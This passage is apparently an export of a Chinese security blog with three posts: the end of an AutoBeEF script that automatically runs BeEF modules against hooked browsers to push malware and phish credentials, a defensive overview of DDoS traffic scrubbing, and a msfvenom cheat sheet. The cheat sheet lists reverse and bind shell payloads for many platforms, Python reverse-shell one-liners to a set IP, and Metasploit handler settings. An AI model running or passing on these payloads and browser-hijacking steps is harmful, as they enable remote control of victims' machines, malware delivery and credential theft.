operator">+</span> authkey    <span class="token keyword">print</span> <span class="token string">"[+] Base BeEF API URL: "</span><span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"api/"</span>    <span class="token keyword">print</span> <span class="token string">"[+] Hook URL   : "</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"hook.js"</span>    <span class="token keyword">print</span> <span class="token string">"[+] Hook Demo  : "</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"demos/basic.html"</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            getHookedBrowsersSession<span class="token punctuation">(</span>host<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span>            <span class="token keyword">for</span> x <span class="token keyword">in</span> hostdict<span class="token punctuation">:</span>                <span class="token keyword">if</span> hostdict<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> hostlist<span class="token punctuation">:</span>                    hostlist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hostdict<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>                    autoRunModules<span class="token punctuation">(</span>host<span class="token punctuation">,</span>hostdict<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span>authkey<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>interval<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span> e<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    beefhost <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>    timeRun<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>beefhost<span class="token punctuation">)</span></code></pre><p>代码比较挫，没有什么要说的，容易遇到问题的地方是处理返回的数据类型，需要注意str，dict，list等数据类型的处理与转换。我先只执行一个<code>Redirect Browser</code>模块  <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617003311540-78403110.png" alt="img"></p><p>程序检测到有新的上线控制僵尸，会控制浏览器自动下载我们的恶意程序</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617003541103-212055404.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615152255946-2107420660.png" alt="img"></p><p>一旦受害者点击这个程序</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615152403571-828718163.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617001607243-12774633.png" alt="img"></p><p>当受害者运行恶意软件时，我们可以获得控制权</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617002351884-563419008.png" alt="img"></p><p> 当然我们也可以执行多个模块，你只需要在<code>autoRunModules</code>函数中添加你想执行的模块即可，比如我再测试执行<code>Confirm Close Tab</code>，<code>Raw Javascript</code>两个模块</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617005001353-1901279339.png" alt="img"></p><p> 但是需要注意的是，有些模块功能上是冲突的，不能一起执行，比如刚才的例子<code>Confirm Close Tab</code>和<code>Redirect Browser</code>。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004455790-594573000.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004850509-742204547.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004904337-1959497895.png" alt="img"></p><p> 我们可以执行多个模块，运行截图</p><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004610321-454563044.png" alt="img"></p><p>到这里也就基本差不多了，只要思路够开阔，就有很多好玩的姿势，下面一些好玩的模块：</p><blockquote><p>Create Invisible Frame    + Browser Autopwn ：我们可以用metasploit的 Browser Autopwn模块生成一个攻击浏览器的url，然后创建一个隐藏的iframe指向这个url</p><p>Raw Javascript ： 光是这个就能干很多事，不只是弹框哦～～</p><p>Fake Notification Bar ，Fake Flash Update： 伪装浏览器插件，flash升级等，配合执行恶意软件</p><p>Pretty Theft： 欺骗认证凭据的，可以试着自己做个模板，哪里能用到？。。报名统计啦，手机投票啦～～</p></blockquote><p>配合一些漏洞</p><blockquote><p>ms10-046　Microsoft Windows Shell LNK Code Execution</p><p>CVE-2015-0096 Microsoft Windows Shell SMB LNK Code Execution Exploit</p></blockquote><p>不知道能不能配合永恒之蓝的msf模块～～～～</p><p>对于手机，也有很多模块可以使用</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617121511915-926020588.png" alt="img"></p><p><strong>关于代码</strong> </p><p>如果你要使用AutoBeef，你需要对代码进行一些修改使其适应你的beef平台，比如beef主机地址，某个模块的id等等。你可以根据自己的需要添加相关模块，你也可以对其进行优化，使其更加健壮。其实官方也提供了beefapi的库，你可以在这里找到<a href="https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py</a>。通过调用里面的函数，我们也可以很方面地对beef进行控制，但是涉及到执行某个模块时，我们还是需要查看模块详细信息，提供其必要的参数。所以，我建议自己可以动手实现一下，只有这样我们才能进步提高，而且自己写的代码，可以根据自己的需要随时进行拓展修改，遇到问题也能很快解决。</p><p>如果你要使用官方提供的beefAPI，你需要把它移植到你的python库中,kali里默认路径是这样：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">cp</span> beefapi.py /usr/lib/python2.7/dist-packages/</code></pre><p> 使用的时候从beefapi中导入即可，你可以查看帮助或者阅读其源代码</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617123124759-1335061642.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617123219259-2082291478.png" alt="img"></p><p><strong>遇到的问题</strong></p><p>　　测试过程中我使用的是chrome和firefox，并且发现IE,360等浏览器无法正常hook。</p><h1 id="四-最后的话"><a href="#四-最后的话" class="headerlink" title="四. 最后的话"></a>四. 最后的话</h1><p>　　只是一句话，不要随便点开一个链接。</p><p>参考文章</p><p><a href="https://github.com/beefproject/beef/wiki/BeEF-RESTful-API" target="_blank" rel="noopener">https://github.com/beefproject/beef/wiki/BeEF-RESTful-API</a></p><p><a href="https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py</a></p>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BeEF </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>攻击流量的清洗</title>
      <link href="/gong-ji-liu-liang-de-qing-xi/"/>
      <url>/gong-ji-liu-liang-de-qing-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>　　流量清洗是指在全部的网络流量中区分出正常流量和恶意流量，将恶意流量阻断和丢弃，而只将正常的流量交付给服务器。与其他的网络安全检测和防护手段类似，流量清洗也需要考虑漏报率和误报率的问题。通常，漏报率和误报率是一对矛盾，需要通过对检测和防护规则的调整来进行平衡。</p><p>​    如果流量清洗的漏报率太高，就会有大量的攻击请求穿透流量清洗设备，如果无法有效地减少攻击流量，也就达不到减轻服务器压力的效果；相反，如果误报率太高，就会出现大量的正常请求在清洗过程中被中断，严重影响正常的服务和业务运行。</p><p>​    优秀的流量清洗设备，应该能够同时将误报率和漏报率降低到可以接受的程度，这样就能够在不影响网络或业务系统正常运行的情况下，最大限度地将恶意攻击流量从全部网络流量中去除。要达到这个目的，需要同时使用多种准确而高效的清洗技术，这些技术包括：</p><ul><li>IP信誉检查</li><li>攻击特征匹配</li><li>速度检查与限制</li><li>TCP代理和验证</li><li>协议完整性验证</li><li>客户端真实性验证</li></ul><h2 id="IP信誉检查"><a href="#IP信誉检查" class="headerlink" title="IP信誉检查"></a>IP信誉检查</h2><p>　　IP信誉机制是指为互联网上的IP地址赋予一定的信誉值，那些过去或现在经常被作为僵尸主机发送垃圾邮件或发动拒绝服务攻击的IP地址会被赋予较低的信誉值，说明这些IP地址更有可能成为网络攻击的来源。</p><p>　　IP信誉检查的极端情况就是IP黑名单机制，即如果数据包的来源存在于黑名单当发生分布式拒绝服务攻击时，流量清洗设备会对通过的网络流量进行IP信誉检查，在其内部的IP地址信誉库中查找每一个数据包来源的信誉值，并会优先丢弃信誉值低的IP地址所发来的数据包或建立的会话连接，以此保证信誉高的IP地址与服务器的正常通信。</p><h2 id="攻击特征匹配"><a href="#攻击特征匹配" class="headerlink" title="攻击特征匹配"></a>攻击特征匹配</h2><p>　　在大多数情况下，发动分布式拒绝服务攻击需要借助攻击工具。为了提高发送请求的效率，<strong>攻击工具发出的数据包通常是由编写者伪造并固化到工具当中的</strong>，而不是在交互过程中产生的，因此一种攻击工具所发出的数据包载荷会具有一些特征。流量清洗设备可以<strong>将这些数据包载荷中的特征作为指纹</strong>，来识别工具发出的攻击流量。指纹识别可以分为静态指纹识别和动态指纹识别两种。</p><p>​    静态指纹识别是指预先将多种攻击工具的指纹特征保存在流量清洗设备内部，设备将经过的网络数据包与内部的特征库进行比对，直接丢弃符合特征的数据包。</p><p>​    动态指纹识别则需要清洗设备对流过的网络数据包进行学习，在学习到若干个数据包的载荷部分之后，将其指纹特征记录下来，后续命中这些指纹特征的数据包会被丢弃，而长期不被命中的指纹特征会逐渐老化直至消失。</p><h2 id="速度检查与限制"><a href="#速度检查与限制" class="headerlink" title="速度检查与限制"></a>速度检查与限制</h2><p>　　一些攻击方法在数据包载荷上可能并不存在明显的特征，没有办法进行攻击特征匹配，但却在请求数据包发送的频率和速度上有着明显的异常。这些攻击方法可以通过速度检查与限制来进行清洗。</p><p>​    例如，在受到<code>THC SSL DoS</code>攻击时，会在同一个SSL会话中多次进行加密密钥的重协商，而正常情况下是不会反复重协商加密密钥的。因此，当流量清洗设备进行统计时，如果发现SSL会话中密钥重协商的次数超过了特定的阈值，就可以直接中断这个会话并把来源加入黑名单中。</p><p>​    再如，在受到Slowloris和慢速POST请求攻击时，客户端和服务器之间会以非常低的速率进行交互和数据传输。流量清洗设备在发现HTTP的请求长时间没有完成传输时，就可以将会话中断。此外，对于UDP洪水攻击等一些没有明显特征、仅通过大流量进行攻击的方法，可以通过限制流速的方式对其进行缓解。</p><h2 id="TCP代理和验证"><a href="#TCP代理和验证" class="headerlink" title="TCP代理和验证"></a>TCP代理和验证</h2><p>　　SYN洪水攻击等攻击方式都是利用TCP协议的弱点，将被攻击目标的连接表占满，使其无法创建新的连接而达到拒绝服务攻击的目的。流量清洗设备可以通过TCP代理和验证的方法来缓解这种攻击造成的危害。</p><p>​    在一个TCP SYN请求到达流量清洗设备后，设备并不将它交给后面的服务器，而是直接回复一个<code>SYN+ACK响应</code>，并等待客户端回复。如果SYN请求来自合法的用户，那么他会对SYN+ACK进行响应，这时流量清洗设备会代替用户与其保护之后，合法的用户和服务器之间就可以透过流量清洗设备，进行正常数据通信。对于用户来说整个过程是完全透明的，正常的交互没有受到任何影响。然后服务器建立起TCP连接，并将这个连接加入信任列表当中。而如果这个SYN请求来自攻击者，那么它通常不会对SYN+ACK进行应答，从而形成半开连接。这样流量清洗设备会暂时保留这个半开连接，并在经过短暂的超时时间之后丢弃这个连接</p><p>　　相比于所保护的服务器，流量清洗设备对连接表操作进行了专门优化，能够处理极其庞大的连接请求数量，因此即使有非常多的SYN请求同时涌向清洗设备，清洗设备也能够处理。在这个过程中，由于清洗设备拦截在被保护的服务器之前，服务器并没有消耗任何的连接资源，因此保证了服务器的性能不受影响。</p><p>​    流量清洗设备在作为TCP代理进行防护时，除了拦截半开连接外，还可以进行TCP协议的一些交互式验证。例如，在收到第一个SYN请求时，通过直接丢弃、发送RST包或发送错误序列号的ACK包的方式来中断连接过程，并检查客户端是否重新发起连接请求。通过这种验证，也可以识别并丢弃许多不合法的连接。</p><h2 id="协议完整性验证"><a href="#协议完整性验证" class="headerlink" title="协议完整性验证"></a>协议完整性验证</h2><p>　　为了提高发送攻击请求的效率，大多数的攻击方法都会只发送攻击请求，而不接收服务器响应的数据，或者无法完全理解和处理响应数据。因此，如果能够对请求来源进行交互式验证，就可以检查请求来源协议实现的完整性。</p><p>​        对于协议实现不完整的请求来源，通常可以将其作为攻击主机丢弃其发送的数据。在DNS解析的过程中，如果域名解析请求获得的响应数据中Flags字段的Truncated位被置位，通常客户端就会使用TCP 53端口重新发送域名解析请求。而攻击者使用的攻击工具由于不接收或不处理解析请求的响应数据，也就不会使用TCP 53端口进行重新连接。流量清洗设备可以利用这个区别来有效地区分合法用户与攻击者，拦截恶意的DNS攻击请求</p><p>　　对于提供HTTP服务的Web服务器，也可以使用类似的方式进行协议完整性验证。例如，可以使用HTTP协议中的302重定向来验证请求的来源是否接收了响应数据并完整实现了HTTP协议的功能。HTTP的302状态码表示被请求的资源被临时转移，并会给出一个转移后的地址。正常的合法用户在接收到302重定向后会顺着跳转地址寻找对应的资源，而攻击者的攻击工具由于不接收或不处理响应数据，则不会进行跳转，因此攻击请求会被清洗设备拦截，Web服务器不会受到任何影响。</p><h2 id="客户端真实性验证"><a href="#客户端真实性验证" class="headerlink" title="客户端真实性验证"></a>客户端真实性验证</h2><p>　　进行协议完整性验证能够清洗掉一部分简单的攻击工具所发送的攻击流量，但是，一些攻击工具在开发过程中使用了现成的协议库，这样就能够完整实现协议交互，通过协议完整性检验。对于这些攻击工具，需要使用客户端真实性验证技术进行攻击流量清洗。</p><p>​    客户端真实性验证是指对客户端程序进行挑战–应答式的交互验证，检查客户端能否完成特定的功能，以此来确定请求数据是否来自真实的客户端。对基于页面的Web服务，可以通过检查客户端是否支持JavaScript来验证请求是否来自真实的浏览器客户端。<strong>当收到HTTP请求时，流量清洗设备会使用JavaScript等脚本语言发送一条简单的运算操作。</strong>如果请求是由真实的浏览器发出的，那么浏览器会进行正确运算并返回结果，流量清洗设备进行结果验证后就会让浏览器进行正确运算并返回结果，流量清洗设备进行结果验证后就会让浏览器跳转到Web服务器上真正的资源位置，不会影响正常用户的访问；而如果请求是由攻击者通过攻击工具发送的，由于大部分工具没有实现JavaScript的解析和执行功能，因而不能返回正确的运算结果，流量清洗设备会直接丢弃这些请求，而不会给出跳转到Web服务器的连接，因此Web服务器不会受到影响</p><p>　　当然，攻击者也可以牺牲工具的一部分攻击效率，并在工具中加入JavaScript的解析和执行功能，以便通过JavaScript验证。这时，则需要使用验证码进行人机识别。验证码的全称是“全自动区分计算机和人类的图灵测试”<code>（Completely Automated Public Turing test to tell Computers and Humans Apart，CAPTCHA）</code>，这是一种用于分辨人与计算机的反向图灵测试。</p><h2 id="图灵测试和反向图灵测试"><a href="#图灵测试和反向图灵测试" class="headerlink" title="图灵测试和反向图灵测试"></a>图灵测试和反向图灵测试</h2><p>　　图灵测试（又称<code>图灵判断</code>）是图灵提出的一个关于机器人的著名判断原则。图灵测试是一种测试机器是不是具备人类智能的方法：被测试的包括一个人和一台声称自己有人类智力的机器。测试人在与被测试者（一个人和一台机器）隔开的情况下，通过一些装置（如键盘）向被测试者随意提问。问过一些问题后，如果测试人不能确认被测试者的答复中哪个是人、哪个是机器的回答，那么这台机器就通过了测试，并被认为具有人类智能。目前，还没有一台机器能够通过图灵测试。可以看出，图灵测试是由人来出题考验机器，其目的是让出题人无法分辨给出答案的是人还是机器；而验证码与这个过程相反，是由机器来自动生成题目，其目的是让出题人能够有效地分辨给出答案的是不是真实的人。因此，验证码通常被认为是一种反向图灵测试。常见的验证码是让用户输入一个扭曲变形的图片上所显示的文字。对于真实的人类用户来说，通常能够比较容易地识别出这些文字，给出正确的识别结果，从而通过测试并继续进行访问</p><p>　　而对于计算机来说，想要识别验证码中的文字则相当困难。对于无法给出验证码正确识别结果的请求，流量清洗设备会直接丢弃，从而保护Web服务器不受影响误区：DDoS的云端清洗服务和本地缓解设备可以相互替代。DDoS其实是多种攻击的统称，不同的攻击也许要不同的缓解方法。通常，云端清洗服务主要采用稀释和分流的方法，擅长应对流量型DDoS攻击；而本地缓解设备能够处理的流量较小，更容易组合使用多种清洗技术，适合对抗系统资源消耗型和应用资源消耗型DDoS攻击。用户应该根据自己的业务特点和主要威胁，选择适合自身的解决方案。</p>]]></content>
      
      
      <categories>
          
          <category> 安全建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DDOS </tag>
            
            <tag> IDS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>msfvenom生成payload</title>
      <link href="/msfvenom-sheng-cheng-payload/"/>
      <url>/msfvenom-sheng-cheng-payload/</url>
      
        <content type="html"><![CDATA[<h1 id="msfvenom重要参数"><a href="#msfvenom重要参数" class="headerlink" title="msfvenom重要参数"></a>msfvenom重要参数</h1><p>查看payloads: <code>msfvenom --list payloads</code><br>查看支持的文件格式：<code>msfvenom --help-formats</code><br>查看<code>payload</code>所需参数：<code>msfvenom -p xxx --payload-options</code></p><p>编码参数</p><pre class=" language-bash"><code class="language-bash">-e x86/shikata_ga_nai -i 5 -b <span class="token string">"\x00"</span> //使用shikata_ga_nai编码器编码5次并去除空字符</code></pre><h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><pre class=" language-bash"><code class="language-bash">windows/shell_bind_tcpwindows/meterpreter/bind_tcpwindows/meterpreter/reverse_tcpwindows/x64/meterpreter/reverse_tcplinux/x86/shell_bind_tcplinux/x86/meterpreter_reverse_tcp</code></pre><h2 id="System-Payloads"><a href="#System-Payloads" class="headerlink" title="System Payloads"></a>System Payloads</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f elf <span class="token operator">></span> shell.elf</code></pre><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>messagebox Test</p><pre class=" language-bash"><code class="language-bash">msfvenom -a x86 -p windows/messagebox TEXT<span class="token operator">=</span><span class="token string">"hello, it is a test"</span></code></pre><p>windows下生成32位/64位payload时需要注意。</p><pre class=" language-bash"><code class="language-bash">msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exemsfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exemsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe</code></pre><p>以<code>windows/meterpreter/reverse_tcp</code>为例，该payload默认为32位，也可使用<code>-a x86</code>选项指定。</p><p>如果要生成64位，则payload为<code>windows/x64/meterpreter/reverse_tcp</code>。</p><h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>nc正向连接</p><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_hidden_bind_tcp rhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>8956 -f exe<span class="token operator">></span> 1.exe      </code></pre><p> nc反向连接，监听</p><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp lhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>888 -f exe<span class="token operator">></span> 1.exe</code></pre><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho <span class="token operator">></span> shell.macho</code></pre><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><pre class=" language-bash"><code class="language-bash">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.apk</code></pre><h2 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p php/meterpreter_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.php<span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">'&lt;?php '</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">></span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">>></span> shell.php</code></pre><h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f asp <span class="token operator">></span> shell.asp</code></pre><h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.jsp</code></pre><h3 id="war"><a href="#war" class="headerlink" title="war"></a>war</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f war <span class="token operator">></span> shell.war</code></pre><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_python LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.pymsfvenom -a python -p python/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.py</code></pre><p>正向shell</p><pre class=" language-python"><code class="language-python">python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.176.1",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('172.16.176.1',9999))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span></code></pre><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_bash LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.sh</code></pre><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_perl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.pl</code></pre><h1 id="MSF监听"><a href="#MSF监听" class="headerlink" title="MSF监听"></a>MSF监听</h1><pre class=" language-bash"><code class="language-bash">use exploit/multi/handler<span class="token keyword">set</span> PAYLOAD <span class="token operator">&lt;</span>Payload name<span class="token operator">></span><span class="token keyword">set</span> RHOST <span class="token operator">&lt;</span>RHOST value<span class="token operator">></span><span class="token keyword">set</span> RPORT <span class="token operator">&lt;</span>RPORT value<span class="token operator">></span><span class="token keyword">set</span> LHOST <span class="token operator">&lt;</span>LHOST value<span class="token operator">></span><span class="token keyword">set</span> LPORT <span class="token operator">&lt;</span>LPORT value<span class="token operator">></span><span class="token keyword">set</span> ExitOnSession <span class="token boolean">false</span>exploit -j -z</code></pre><p>其他设置</p><p><code>AutoRunScript</code>：自动执行脚本<br>如：自动执行<code>post/windows/manage/migrate</code> 模块注入其他进程</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> AutoRunScript post/windows/manage/migrate</code></pre><p>自动注入进程</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> prependmigrate <span class="token boolean">true</span><span class="token keyword">set</span> prependmigrateProc svchost.exe</code></pre><p>辅助配置</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> exitonsession <span class="token boolean">false</span> //可以让建立监听的端口继续保持侦听，可以接受多个session<span class="token keyword">set</span> stagerverifysslcert <span class="token boolean">false</span> //防止获取shell的时候出现的SSL_accept错误</code></pre>]]></content>
      
      
      <categories>
          
          <category> 攻防渗透 </category>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> metasploit </tag>
            
            <tag> RAT </tag>
            
            <tag> 木马后门 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
